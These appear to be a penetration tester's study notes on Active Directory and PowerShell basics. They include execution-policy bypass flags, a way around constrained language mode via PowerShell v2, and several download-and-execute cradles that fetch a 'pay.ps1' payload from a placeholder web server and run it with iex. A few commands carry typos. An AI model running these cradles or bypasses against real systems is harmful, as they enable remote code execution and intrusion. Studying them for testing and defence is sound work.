# AD - Basics & PowerShell Basics

## AD Basics

* Components of AD
  * Shema - Defines objects and their attributes
  * Query and index mechanisem
  * Global catalog - Information about every object
  * Replication service - Distributes information accross domain controllers
* A forest - which is a security boundary - may contain multiple domains and each domain may contain multiple Ous

### How to interact with Active Directory

* \[ADSI]
* .NET Classes (System.DirectoryServices.ActiveDirectoryy)
* Native Executables (like net….)
* PowerShell (.NET classes and WMI)

## Powershell Basics

With PowerShell Scripts you can use cmdlets, native commands, functions, .net, dlls, Windows API

### Help Command

Get-Help \* - Lists everything abtout the help topic

Get-Help process (lists everything which contains the word process)

Update-Help - Update the healp system (v3+)

Get-help cmdlet\_name -Full - List full help about a topic

Get-Help cmdlet\_name -Examples

Get-command -CommandType cmdlet - List all cmdlets



**Use this parameter to not print errors powershell**\
****-ErrorAction SilentlyContinue

**Rename powershell windows**\
****$host.ui.RawUI.WindowTitle = "name"\
****&#x20;

### Execution Policy

It is NOT a security boundary

Powershell -exectionpolicy bypass\
powershell -ep bypass\
Powershell -c \<cmd>\
Powersehll -encodedcommand $env:PSExecutionPolicyPreference="bypass"

### Language Mode

**Display current language mode**\
$executioncontext.sessionstate.languagemode

Constrained Language mode is the restriction of types which are not safe/disallowed in constrained language mode. E.g. .Net Classes,\
Only Built-In Commandlets can be used and types/classes etc. are restricted\
Can be configured via AppLoker or Windows Defender Application Mode in Enforcement mode.

Constrained language mode is only for Powershellv5.1, v7 - if attacker can run Powershellv2 no language mode enforcement is possible.

****

### Execute .PS1 File / PowerView

. .\PowerView.ps1

iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -UseBasicParsing)

### Execute AD Module

Download [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)

Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose\
Import-Module .\ActiveDirectory\ActiveDirectory.psd1

{% hint style="info" %}
Most of the AD Modules have the -Filter -Properties and -Identity options!

Get-AD-User -Filter \* -Properties \*\
Get-AD-User -Identity username1 -Properties \*
{% endhint %}

\
iex (new-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory](https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1'\);Import-ActiveDirectory)

To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.\
Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose\
Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1\
Get-Command -Module ActiveDirectory

### Module

**Import a module/file**\
Import-Module \<modulepath>

**List all commands of a module**\
Get-Command -Module \<modulename>

**Display Loaded functions**\
ls function:

### Download and execute PowerShell Scripts

iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)

&#x20;**Use a COM Object**

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://webserver/pay.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

**PSv3 or newer**

Iex (iwr '[http://websever/ps.ps1](http://websever/ps.ps1)') -iwr is alias for invoke-web request

&#x20;$h=New-Object -ComObject\
Msxml2.xmlhttp;$h.open('GET','http://webserver/ps.ps1',$fasle);$h.send();iex $h.responseText

&#x20;$wr = \[System.NET.WebRequest]::Create("http://werbser.ps.ps1")\
$r = $wr.GetResponse()\
IEX (\[System.IO.StreamReader]\($r.GetResponseStream())).ReadToEnd()

&#x20;







